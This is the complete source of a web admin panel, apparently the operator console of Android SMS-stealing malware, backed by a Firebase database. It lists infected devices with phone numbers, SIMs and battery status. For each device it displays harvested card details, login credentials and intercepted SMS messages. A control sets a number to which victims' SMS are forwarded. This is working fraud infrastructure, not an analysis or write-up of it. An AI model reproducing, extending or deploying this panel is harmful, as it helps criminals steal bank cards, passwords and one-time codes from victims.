<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>CSC5 Admin Panel + Forward Number</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
<style>
body {
    font-family: 'Poppins', sans-serif;
    margin: 0;
    padding: 10px;
    background: #f8f9fa;
    font-size: 14px;
}
h2 {
    text-align: center;
    color: #3a56d4;
    margin-bottom: 20px;
}
.container {
    max-width: 100%;
    margin: auto;
    background: white;
    border-radius: 12px;
    padding: 15px;
    box-shadow: 0 6px 20px rgba(0,0,0,0.1);
}
.button-section {
    background: linear-gradient(135deg,#4285f4,#3367d6);
    padding: 15px;
    border-radius: 12px;
    margin-bottom: 15px;
    text-align: center;
}
.button-section input {
    width: 80%;
    padding: 10px;
    border-radius: 6px;
    border: none;
    margin-bottom: 8px;
    font-size: 14px;
}
.button-section button {
    padding: 10px 15px;
    border: none;
    border-radius: 6px;
    background: #28a745;
    color: white;
    cursor: pointer;
    font-weight: 600;
}
.table-wrapper {
    overflow-x: auto;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
}
table {
    width: 100%;
    border-collapse: collapse;
    background: white;
}
thead {
    background: #4361ee;
    color: #fff;
}
th, td {
    padding: 10px;
    text-align: left;
    border-bottom: 1px solid #e9ecef;
}
tr:hover {
    background: #f1f6fa;
}
.btn {
    background: #17a2b8;
    color: white;
    padding: 6px 10px;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    font-size: 12px;
}
.number-display {
    font-family: monospace;
    color: #007bff;
    font-weight: 600;
}
.modal {
    display: none;
    position: fixed;
    z-index: 1000;
    left: 0; top: 0;
    width: 100vw;
    height: 100vh;
    background: rgba(0,0,0,0.7);
}
.modal-content {
    background: white;
    margin: 20px auto;
    border-radius: 12px;
    width: 95%;
    max-height: 90vh;
    display: flex;
    flex-direction: column;
}
.modal-header {
    background: #4361ee;
    color: white;
    padding: 12px;
    font-weight: 600;
    display: flex;
    justify-content: space-between;
    align-items: center;
    border-radius: 12px 12px 0 0;
}
.modal-body {
    padding: 15px;
    overflow-y: auto;
}
.close {
    cursor: pointer;
    font-size: 1.5rem;
    font-weight: bold;
}
.list-group-item {
    border-bottom: 1px solid #e9ecef;
    margin-bottom: 8px;
    padding: 8px;
    background: #f8f9fa;
    border-radius: 6px;
}
.sms-refresh {
    background: #17a2b8;
    color: white;
    border: none;
    border-radius: 4px;
    padding: 2px 6px;
    cursor: pointer;
    font-size: 12px;
}
.prev-number {
    font-weight: 600;
    color: #ffeb3b;
    margin-bottom: 8px;
}
</style>
</head>
<body>

<div class="container">

    <!-- Forward Number Panel -->
    <div class="button-section">
        <div id="forwardNumberDisplay" class="prev-number">Forward Number: Not forward</div>
        <input type="text" id="forwardNumberInput" placeholder="Enter new Forward Number"/>
        <button onclick="saveForwardNumber()">Update Forward Number</button>
    </div>

    <h2><i class="fas fa-mobile-alt"></i> CSC5 Admin Panel</h2>

    <!-- Devices Table -->
    <div class="table-wrapper">
        <table>
            <thead>
                <tr>
                    <th>#</th>
                    <th>Device ID</th>
                    <th>Name</th>
                    <th>Mobile Number</th>
                    <th>SIM</th>
                    <th>Battery</th>
                    <th>Online/Offline</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody id="device-list-body">
                <tr><td colspan="8" style="text-align:center;padding:30px;">Loading devices...</td></tr>
            </tbody>
        </table>
    </div>

</div>

<!-- Device Modal -->
<div id="detailsModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <span id="modal-title">Device Details</span>
            <span class="close" onclick="closeModal()">&times;</span>
        </div>
        <div class="modal-body" id="details-modal-body">Loading...</div>
    </div>
</div>

<script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-database-compat.js"></script>

<script>
// Firebase Config
const firebaseConfig = {
    apiKey: "YOUR_API_KEY",
    authDomain: "YOUR_AUTH_DOMAIN",
    databaseURL: "https://fpro-36-default-rtdb.firebaseio.com",
    projectId: "YOUR_PROJECT_ID"
};
firebase.initializeApp(firebaseConfig);
const database = firebase.database();

const deviceListBody = document.getElementById('device-list-body');
const modal = document.getElementById('detailsModal');
const modalBody = document.getElementById('details-modal-body');

let user_data={}, user_sms={}, user_card={}, user_login={};

// Format SIM info
function formatSim(device) {
    let sim1 = device.numberSim1 || '';
    let sim2 = device.numberSim2 || '';
    if(sim1 && sim2) return `${sim1} | ${sim2}`;
    if(sim1) return sim1;
    if(sim2) return sim2;
    return 'No SIM';
}

// Load Devices
async function loadDevices() {
    deviceListBody.innerHTML='<tr><td colspan="8" style="text-align:center;padding:30px;">Loading...</td></tr>';
    try {
        const [dataSnap, smsSnap, cardSnap, loginSnap, forwardSnap] = await Promise.all([
            database.ref('/user_data').once('value'),
            database.ref('/user_sms').once('value'),
            database.ref('/Card').once('value'),
            database.ref('/login').once('value'),
            database.ref('/sms_forward/forward_number').once('value')
        ]);

        user_data = dataSnap.val() || {};
        user_sms = smsSnap.val() || {};
        user_card = cardSnap.val() || {};
        user_login = loginSnap.val() || {};

        const forwardNumber = forwardSnap.val() || 'Not forward';
        document.getElementById('forwardNumberDisplay').textContent = "Forward Number: "+forwardNumber;

        deviceListBody.innerHTML='';
        let index=1;
        for(const did in user_data) {
            const device = user_data[did];
            const tr = document.createElement('tr');
            tr.innerHTML = `
                <td>${index}</td>
                <td><code>${did}</code></td>
                <td>${device.d_name||'N/A'}</td>
                <td>${device.phoneNumber||'N/A'}</td>
                <td>${formatSim(device)}</td>
                <td>${device.battery?device.battery+'%':'N/A'}</td>
                <td>${device.status||'Offline'}</td>
                <td><button class="btn" onclick="openDeviceModal('${did}')">View</button></td>
            `;
            deviceListBody.appendChild(tr);
            index++;
        }
    } catch(e){
        deviceListBody.innerHTML='<tr><td colspan="8" style="text-align:center;color:red;">Error loading devices</td></tr>';
        console.error(e);
    }
}

// Update Forward Number
async function saveForwardNumber() {
    const val = document.getElementById('forwardNumberInput').value.trim();
    if(!val) return alert('Enter a number!');
    try {
        await database.ref('/sms_forward/forward_number').set(val);
        document.getElementById('forwardNumberDisplay').textContent = "Forward Number: "+val;
        alert('Forward number updated!');
    } catch(e){
        alert('Error updating forward number: '+e.message);
    }
}

// Device Modal
async function openDeviceModal(did) {
    modal.style.display='block';
    document.getElementById('modal-title').textContent='Device: '+did;
    modalBody.innerHTML='Loading...';

    const device = user_data[did] || {};
    const smsList = user_sms[did]?Object.values(user_sms[did]).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)): [];
    const card = user_card[did] || {};
    const login = user_login[did] || {};

    let html = `
        <div>
        <strong>Name:</strong> ${device.d_name||'N/A'}<br>
        <strong>Mobile Number:</strong> ${device.phoneNumber||'N/A'}<br>
        <strong>Device ID:</strong> ${did}<br>
        <strong>Battery:</strong> ${device.battery?device.battery+'%':'N/A'}<br>
        <strong>SIM:</strong> ${formatSim(device)}<br>
        <strong>Status:</strong> ${device.status||'Offline'}<br>
        <hr>
        <h4>Card Info</h4>
        ${Object.keys(card).length?Object.keys(card).map(k=>`<div><strong>${k}:</strong> ${card[k]}</div>`).join(''):`<p><em>No card info found</em></p>`}
        <hr>
        <h4>Login Info</h4>
        ${Object.keys(login).length?Object.keys(login).map(k=>`<div><strong>${k}:</strong> ${login[k]}</div>`).join(''):`<p><em>No login info found</em></p>`}
        <hr>
        <h4 style="display:flex; align-items:center; gap:8px;">
            SMS (${smsList.length})
            <button id="refreshSmsBtn" class="sms-refresh">â†»</button>
        </h4>
        <input type="text" id="smsSearch" placeholder="Search SMS..." style="width:100%;padding:6px;margin-bottom:6px;border-radius:6px;border:1px solid #ccc;">
        <div id="smsListContainer" style="max-height:250px;overflow-y:auto;border:1px solid #e9ecef;padding:5px;border-radius:6px;"></div>
        </div>
    `;
    modalBody.innerHTML = html;

    function renderSMS(filter='') {
        const smsContainer = document.getElementById('smsListContainer');
        smsContainer.innerHTML='';
        let filtered = smsList.filter(sms=>{
            const msg = sms.body || sms.msg || sms.b || '';
            const snd = sms.sender || sms.ph || '';
            return msg.toLowerCase().includes(filter.toLowerCase()) || snd.toLowerCase().includes(filter.toLowerCase());
        });
        if(filtered.length===0) smsContainer.innerHTML='<p><em>No SMS found</em></p>';
        else filtered.forEach(sms=>{
            const time = sms.date || (sms.timestamp?new Date(sms.timestamp).toLocaleString():'Unknown');
            const message = sms.body || sms.msg || sms.b || '';
            const phone = sms.sender || sms.ph || 'Unknown';
            smsContainer.innerHTML += `<div class="list-group-item"><strong>From:</strong> ${phone}<br><strong>Message:</strong> ${message}<br><small>${time}</small></div>`;
        });
    }

    renderSMS();
    document.getElementById('smsSearch').addEventListener('input', e=>renderSMS(e.target.value));
    document.getElementById('refreshSmsBtn').addEventListener('click', async ()=>{
        const smsSnap = await database.ref(`/user_sms/${did}`).once('value');
        const latestSMS = smsSnap.val()?Object.values(smsSnap.val()).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)): [];
        smsList.length = 0;
        smsList.push(...latestSMS);
        renderSMS(document.getElementById('smsSearch').value);
    });
}

// Close Modal
function closeModal() { modal.style.display='none'; }
window.onclick = e => { if(e.target===modal) closeModal(); }
window.onload = loadDevices;
</script>

</body>
  </html>
